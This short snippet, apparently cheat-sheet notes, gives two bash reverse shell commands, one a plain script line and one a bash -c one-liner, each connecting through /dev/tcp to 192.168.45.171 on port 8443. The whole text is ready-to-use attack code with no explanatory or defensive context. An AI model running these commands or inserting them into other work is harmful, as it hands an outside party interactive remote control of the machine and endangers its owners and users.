#Reverse Shell in Bash script
bash -i >& /dev/tcp/192.168.45.171/8443 0>&1

#One-liner bash command
bash -c "bash -i >& /dev/tcp/192.168.45.171/8443 0>&1"
